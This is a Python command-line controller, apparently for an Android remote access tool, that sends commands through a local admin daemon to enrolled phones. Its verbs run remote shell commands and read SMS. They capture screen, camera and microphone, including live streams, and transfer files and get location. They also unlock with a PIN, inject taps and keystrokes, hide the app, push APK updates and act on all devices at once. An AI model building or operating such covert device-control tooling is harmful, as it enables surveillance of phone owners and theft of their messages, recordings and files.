#!/usr/bin/env python3
"""ghostctl CLI — talks to the daemon admin port (default 127.0.0.1:8444).

Usage:
  ghostctl.py list | status | devices
  ghostctl.py rotate-token <id|name>            # online bearer-token rotation
  ghostctl.py rotate-admin                      # rotate server/admin.key online
  ghostctl.py remove <id|name> | -d <id> remove  # uninstall apps + drop record
  ghostctl.py -d <id> shell "echo hi"
  ghostctl.py -d <id> files ls|tree|get|put|abort ...
  ghostctl.py -d <id> sms recent [N]
  ghostctl.py -d <id> screen shot|record|live|stop|off ...
  ghostctl.py -d <id> cam snap|live|stop ...
  ghostctl.py -d <id> mic record|live|stop ...
  ghostctl.py -d <id> brightness get|set <0-255>
  ghostctl.py -d <id> volume get|set|mute|unmute [stream] [N]
  ghostctl.py -d <id> wake
  ghostctl.py -d <id> ui dump | ui find --text <t> | ui find --id <id>
  ghostctl.py -d <id> tap <x> <y> | tap <node-id>     (longclick same)
  ghostctl.py -d <id> type <text> | key <code> | swipe <x1> <y1> <x2> <y2>
  ghostctl.py -d <id> unlock <pin> | arm | disarm
  ghostctl.py -d <id> sidekick status|arm|disarm|ping|install [apk]
  ghostctl.py -d <id> loc once
  ghostctl.py -d <id> device info
  ghostctl.py -d <id> hide | unhide | status | restart
  ghostctl.py -d <id> update self|sidekick [--apk path]  # --apk: loopback only
  ghostctl.py apks list
  ghostctl.py apks add ghostd|ghosta <path>   # place APK in server/apks/
  ghostctl.py --all <command> ...             # send command to all devices
  ghostctl.py streams                          # live stream cache

JSON output by default; --pretty for humans.
Env: GHOSTCTL_ADMIN_HOST / GHOSTCTL_ADMIN_PORT (default 127.0.0.1:8444).
Token: GHOSTCTL_ADMIN_TOKEN (env wins), else server/.env, else server/admin.key.
"""
import argparse
import contextlib
import ipaddress
import json
import math
import os
import secrets
import shutil
import socket
import sys
from pathlib import Path

import envfile

ADMIN_HOST = os.environ.get("GHOSTCTL_ADMIN_HOST", "127.0.0.1")
ADMIN_PORT = int(os.environ.get("GHOSTCTL_ADMIN_PORT", "8444"))
MAX_RESPONSE = 48 * 1024 * 1024
# Daemon-side waits for ops that do not (always) carry a client wait:
# files get dispatches with 60s, files put streams with 180s.
OP_DEFAULT_WAIT = {"files_get": 60.0, "files_put": 180.0}
# A self-update pushes the APK and then replaces the ghostd process; the
# daemon keeps the command pending for SELF_UPDATE_WAIT (300s), so the
# socket must outlive push + install + the replacement's reconnect report.
UPDATE_TIMEOUT = 600.0

BASE = Path(__file__).resolve().parent
APK_DIR = BASE / "apks"
UPLOAD_DIR = BASE / "uploads"
APK_NAMES = {"self": "ghostd.apk", "ghostd": "ghostd.apk",
             "sidekick": "ghosta.apk", "ghosta": "ghosta.apk"}

# Verbs passed through verbatim to the daemon command router (the daemon
# whitelist + client CommandHandler validate sub-verbs and args).
PASS_THROUGH = {
    "files", "sms", "screen", "cam", "mic", "brightness", "volume", "wake",
    "ui", "tap", "longclick", "type", "key", "swipe", "unlock", "arm",
    "disarm", "sidekick", "loc", "device", "hide", "unhide", "status",
    "restart",
}


class RpcError(Exception):
    """Clean admin RPC failure (transport, size, or JSON)."""


def _load_admin_token():
    """Admin token from env (wins), server/.env, or server/admin.key.

    Parsing .env with the shared envfile parser keeps quotes/comments
    identical to the daemon and console. A whitespace-only value counts as
    missing, so a blank env entry still falls back to server/admin.key.
    """
    token = (os.environ.get("GHOSTCTL_ADMIN_TOKEN") or "").strip()
    if token:
        return token
    try:
        file_token = envfile.parse_dotenv(BASE / ".env").get(
            "GHOSTCTL_ADMIN_TOKEN")
    except OSError:  # unreadable .env: fall through to admin.key
        file_token = None
    token = (file_token or "").strip()
    if token:
        return token
    try:
        token = (BASE / "admin.key").read_text().strip()
    except (OSError, UnicodeDecodeError):
        token = ""
    return token or None


def _is_loopback_host(host):
    try:
        return ipaddress.ip_address(host).is_loopback
    except ValueError:
        return host.lower() == "localhost"


def bounded_wait(value, default):
    """Clamp wait to the daemon's finite 0.1..300s range."""
    try:
        wait = float(value)
    except (TypeError, ValueError):
        wait = default
    if not math.isfinite(wait):
        wait = default
    return min(300.0, max(0.1, wait))


def default_wait_for(action, args):
    """Per-verb default waits; explicit --wait overrides in main()."""
    sub = (args or [""])[0]
    if action == "screen" and sub in ("shot", "record"):
        return 120.0
    if action == "cam" and sub == "snap":
        return 120.0
    if action == "mic" and sub == "record":
        return 120.0
    return 30.0


def rpc(req):
    # Admin token is added here so every admin request carries it when set.
    req = dict(req)
    token = _load_admin_token()
    if token:
        req["token"] = token

    # Socket timeout must exceed the command wait (screen shot with consent
    # flow can take 60s+); update pushes can take several minutes.
    wait = bounded_wait(req.get("wait"), 10.0)
    if "wait" in req:
        req["wait"] = wait
    timeout = max(30.0, wait + 15.0)
    op = req.get("op")
    if op == "update":
        timeout = max(timeout, UPDATE_TIMEOUT)
    elif op in OP_DEFAULT_WAIT:
        # The response only arrives after the daemon-side transfer wait, so
        # allow that wait (explicit or the daemon's default) plus 15s.
        op_wait = bounded_wait(req.get("wait"), OP_DEFAULT_WAIT[op])
        timeout = max(timeout, op_wait + 15.0)

    try:
        payload = (json.dumps(req) + "\n").encode()
    except (TypeError, ValueError) as e:
        raise RpcError(f"could not encode request: {e}") from e

    try:
        with socket.create_connection((ADMIN_HOST, ADMIN_PORT),
                                      timeout=15) as s:
            s.settimeout(timeout)
            s.sendall(payload)
            buf = b""
            while not buf.endswith(b"\n"):
                chunk = s.recv(65536)
                if not chunk:
                    break
                if len(buf) + len(chunk) > MAX_RESPONSE:
                    raise RpcError(
                        f"response exceeds {MAX_RESPONSE} bytes")
                buf += chunk
    except RpcError:
        raise
    except (OSError, socket.timeout) as e:
        raise RpcError(f"admin connection failed: {e}") from e

    if not buf:
        raise RpcError("empty response from daemon")
    if not buf.endswith(b"\n"):
        raise RpcError("incomplete response from daemon")
    try:
        resp = json.loads(buf)
    except (json.JSONDecodeError, UnicodeDecodeError) as e:
        raise RpcError("invalid JSON response from daemon") from e
    if not isinstance(resp, dict):
        raise RpcError("response is not a JSON object")
    return resp


def emit(data, pretty):
    if pretty:
        print(json.dumps(data, indent=2, sort_keys=True))
    else:
        print(json.dumps(data))


def safe_rpc(req, pretty=None):
    """Centralized RPC/emit/exit handling for the CLI."""
    try:
        resp = rpc(req)
    except (RpcError, OSError) as e:
        sys.exit(str(e))
    if pretty is not None:
        emit(resp, pretty)
    if not resp.get("ok", True):
        sys.exit(resp.get("error") or "rpc failed")
    return resp


# verb -> (action, args). args validated by argparse, translated here.
def build_args(ns):
    verb = ns.verb
    if verb == "shell":
        return "shell", [" ".join(ns.rest)]
    if verb in PASS_THROUGH:
        return verb, list(ns.rest)
    sys.exit(f"unknown verb {verb}")


def parse_update(rest):
    """update self|sidekick [--apk path] -> (target, apk_path_or_None)."""
    r = list(rest)
    target = apk = None
    if r and r[0] in ("self", "sidekick"):
        target = r.pop(0)
    if r and r[0] == "--apk" and len(r) > 1:
        apk = r[1]
    elif r and not r[0].startswith("-"):
        apk = r[0]  # positional path also accepted
    if target not in ("self", "sidekick"):
        sys.exit("update: expected 'self' or 'sidekick' (optionally --apk path)")
    return target, apk


def apks_cmd(rest):
    """Local APK store management (server/apks/, gitignored)."""
    sub = rest[0] if rest else "list"
    if sub == "list":
        APK_DIR.mkdir(exist_ok=True)
        out = {}
        for f in sorted(APK_DIR.glob("*.apk")):
            out[f.name] = f.stat().st_size
        emit({"apks_dir": str(APK_DIR), "apks": out}, False)
        return
    if sub == "add":
        if len(rest) < 3 or rest[1] not in APK_NAMES:
            sys.exit("apks add: expected 'apks add ghostd|ghosta <path>'")
        name, src = APK_NAMES[rest[1]], Path(rest[2]).expanduser()
        if not src.is_file():
            sys.exit(f"no such file: {src}")
        APK_DIR.mkdir(exist_ok=True)
        shutil.copy2(src, APK_DIR / name)
        print(f"stored {src} -> {APK_DIR / name}")
        return
    sys.exit("apks: expected 'list' or 'add ghostd|ghosta <path>'")


def resolve_device(value):
    """Resolve a -d value: exact device id, exact/prefix id match, or the
    device's human name (case-insensitive) — set via `ghostctl.py rename`.
    Exits with a clear error on not-found/ambiguous input."""
    resp = safe_rpc({"op": "list"})
    devices = resp.get("devices") or {}
    if not isinstance(devices, dict):
        devices = {}
    if value in devices:
        return value
    low = value.lower()
    # exact id prefix (short uuid)
    pref = [d for d in devices if d.startswith(value)]
    if len(pref) == 1:
        return pref[0]
    if len(pref) > 1:
        sys.exit(f"ambiguous device prefix {value!r}: "
                 f"{', '.join(sorted(pref))}")
    # name match (case-insensitive, exact then prefix)
    by_name = [d for d, r in devices.items()
               if isinstance(r, dict) and str(r.get("name", "")).lower() == low]
    if len(by_name) == 1:
        return by_name[0]
    if len(by_name) > 1:
        sys.exit(f"ambiguous device name {value!r}: "
                 f"{', '.join(sorted(by_name))}")
    by_name_p = [d for d, r in devices.items()
                 if isinstance(r, dict)
                 and str(r.get("name", "")).lower().startswith(low)]
    if len(by_name_p) == 1:
        return by_name_p[0]
    if len(by_name_p) > 1:
        sys.exit(f"ambiguous device name prefix {value!r}: "
                 f"{', '.join(sorted(by_name_p))}")
    sys.exit(f"device not found: {value!r}")


def stage_update_apk(target, apk):
    """Copy a loopback --apk file into APK_DIR under the canonical name."""
    if not _is_loopback_host(ADMIN_HOST):
        sys.exit("update --apk is only allowed for loopback admin; "
                 "place the APK in server/apks/ and omit --apk")
    src = Path(apk).expanduser()
    if not src.is_file():
        sys.exit(f"no such file: {src}")
    dest = APK_DIR / APK_NAMES[target]
    try:
        APK_DIR.mkdir(exist_ok=True)
        if src.resolve() != dest.resolve():
            shutil.copy2(src, dest)
    except OSError as e:
        sys.exit(f"could not stage APK: {e}")


def files_put_cmd(ns, did, args):
    """`files put <device-dest> <local-src>`: stage locally, then push.

    The daemon only streams sources that live under server/uploads, so copy
    the operator's file to a random mode-600 slot there, invoke the
    authenticated `files_put` op, and always unlink the staged copy.
    """
    if len(args) < 3:
        sys.exit("usage: ghostctl.py -d <device> files put "
                 "<device-dest> <local-src>")
    dest, src = args[1], args[2]
    if not _is_loopback_host(ADMIN_HOST):
        sys.exit("files put requires loopback admin; remote admin is not "
                 "supported for local uploads")
    src_path = Path(src).expanduser()
    if not src_path.is_file():
        sys.exit(f"no such file: {src_path}")
    try:
        UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
    except OSError as e:
        sys.exit(f"could not create uploads directory: {e}")
    staged_name = f"put_{secrets.token_hex(16)}"
    staged_path = UPLOAD_DIR / staged_name
    try:
        try:
            shutil.copyfile(src_path, staged_path)
            os.chmod(staged_path, 0o600)
        except OSError as e:
            sys.exit(f"could not stage file: {e}")
        wait = bounded_wait(ns.wait, 180.0)
        safe_rpc({"op": "files_put", "device_id": did, "dest": dest,
                  "src": staged_name, "wait": wait}, ns.pretty)
    finally:
        with contextlib.suppress(OSError):
            staged_path.unlink()


def main():
    p = argparse.ArgumentParser(prog="ghostctl", description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-d", "--device", help="target device_id")
    p.add_argument("--all", action="store_true",
                   help="send command to all devices")
    p.add_argument("--pretty", action="store_true", help="human-readable output")
    p.add_argument("--wait", type=float, default=None,
                   help="seconds to wait for result (default: per-verb)")
    p.add_argument("verb", help="run ghostctl.py --help for the full verb list")
    p.add_argument("rest", nargs="*", help="verb arguments")
    ns, extra = p.parse_known_args()
    # unknown option-looking args (e.g. client-side `--fps 5`, `--quality 60`)
    # are passed through to the device verbatim
    ns.rest = list(ns.rest) + extra
    if ns.all and ns.device:
        sys.exit("--all and -d are mutually exclusive; pick one target")

    if ns.verb == "apks":  # local file management, no daemon needed
        apks_cmd(ns.rest)
        return
    if ns.verb == "streams":
        safe_rpc({"op": "streams"}, ns.pretty)
        return
    if ns.verb == "config":
        # `config` (show) or `config set <key> <value>`
        if ns.rest and ns.rest[0] == "set":
            if len(ns.rest) < 3:
                sys.exit("usage: ghostctl.py config set <max_pending|max_per_ip> <int>")
            safe_rpc({"op": "config",
                      "args": ["set", ns.rest[1], ns.rest[2]]}, ns.pretty)
        else:
            safe_rpc({"op": "config"}, ns.pretty)
        return
    if ns.verb == "pending" and not ns.device and not ns.all:
        safe_rpc({"op": "pending"}, ns.pretty)
        return
    if ns.verb == "rotate-admin":
        if ns.device or ns.all:
            sys.exit("rotate-admin does not take a device target")
        safe_rpc({"op": "rotate_admin"}, ns.pretty)
        return
    if ns.verb in ("approve", "revoke", "remove", "rotate-token"):
        # device id via -d or as the first positional arg
        did = ns.device or (ns.rest[0] if ns.rest else None)
        if not did:
            sys.exit(f"specify device id: ghostctl.py {ns.verb} <device_id>")
        did = resolve_device(did)
        req = {"op": ns.verb, "device_id": did}
        if ns.verb == "remove":
            # One explicit remove command is the authorization; the daemon
            # asks the device to run `destroy` and can take a while to report.
            req["wait"] = bounded_wait(ns.wait, 150.0)
            req["source"] = "cli"
        elif ns.verb == "rotate-token":
            req["op"] = "rotate_token"
            req["wait"] = min(30.0, bounded_wait(ns.wait, 10.0))
        safe_rpc(req, ns.pretty)
        return
    if ns.verb == "rename":
        # rename <device-id-or-name> <new name...>  (name may contain spaces)
        if len(ns.rest) < 2:
            sys.exit("usage: ghostctl.py rename <device_id> <new name>")
        did = resolve_device(ns.rest[0])
        name = " ".join(ns.rest[1:])
        safe_rpc({"op": "rename", "device_id": did, "name": name}, ns.pretty)
        return
    if ns.verb in ("list", "status", "devices") and not ns.device and not ns.all:
        safe_rpc({"op": "list"}, ns.pretty)
        return
    if ns.verb == "update":
        if ns.all:
            sys.exit("update: --all is not supported; specify -d <device_id>")
        target, apk = parse_update(ns.rest)
        if not ns.device:
            sys.exit("specify -d <device_id>")
        did = resolve_device(ns.device)
        if apk:
            stage_update_apk(target, apk)
        wait = bounded_wait(ns.wait, 300.0)
        safe_rpc({"op": "update", "device_id": did, "target": target,
                  "wait": wait}, ns.pretty)
        return

    action, args = build_args(ns)
    if action == "files" and args and args[0] == "put":
        if ns.all:
            sys.exit("files put: --all is not supported; specify -d <device_id>")
        if not ns.device:
            sys.exit("specify -d <device_id>")
        did = resolve_device(ns.device)
        files_put_cmd(ns, did, args)
        return
    if not ns.all and not ns.device:
        sys.exit("specify -d <device_id> or --all")
    did = ns.device if ns.all else resolve_device(ns.device)
    wait = bounded_wait(ns.wait, default_wait_for(action, args))
    safe_rpc({"op": "command", "all": ns.all, "device_id": did,
              "action": action, "args": args, "wait": wait}, ns.pretty)
    return


if __name__ == "__main__":
    main()
